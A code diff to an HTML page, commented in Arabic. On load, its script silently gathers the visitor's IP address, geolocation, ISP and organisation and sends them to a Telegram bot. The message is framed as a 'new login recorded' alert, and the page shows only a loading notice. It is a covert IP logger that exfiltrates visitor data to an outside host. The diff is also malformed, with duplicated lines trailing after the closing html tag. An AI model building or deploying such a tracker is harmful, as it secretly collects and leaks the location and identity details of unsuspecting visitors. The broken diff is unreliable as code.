@@ -19,22 +19,51 @@
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
 
-                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                // استخدم ip-api.com بدلاً من ipapi.co
+                const locationResponse = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,city,regionName,lat,lon,isp,org`);
                 const locationData = await locationResponse.json();
+
+                if (locationData.status !== 'success') {
+                    document.body.innerHTML = '<h1>❌ فشل جلب الموقع</h1>';
+                    return;
+                }
 
                 const message = `
 🕵️ **تم تسجيل دخول جديد!**
 📌 **IP:** ${ip}
-📍 **الدولة:** ${locationData.country_name || 'غير معروف'}
+📍 **الدولة:** ${locationData.country || 'غير معروف'}
 🏙️ **المدينة:** ${locationData.city || 'غير معروف'}
-🌐 **المزود:** ${locationData.org || 'غير معروف'}
-🖥️ **المتصفح:** ${navigator.userAgent}
-📱 **نظام التشغيل:** ${navigator.platform}
+🗺️ **المنطقة:** ${locationData.regionName || 'غير معروف'}
+🌐 **المزود:** ${locationData.isp || 'غير معروف'}
+📡 **المنظمة:** ${locationData.org || 'غير معروف'}
                 `;
 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // إخفاء رسالة "جاري التحميل" وإظهار نجاح
+                document.body.innerHTML = '<h1>✅ تم الإرسال بنجاح</h1>';
+
+            } catch (error) {
+                console.error('خطأ:', error);
+                document.body.innerHTML = '<h1>❌ حدث خطأ، حاول مرة أخرى</h1>';
+            }
+        }
+
+        window.onload = sendInfo;
+    </script>
+</head>
+<body>
+    <h1>جاري تحميل البيانات...</h1>
+</body>
+</html>                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatId,
                         text: message,
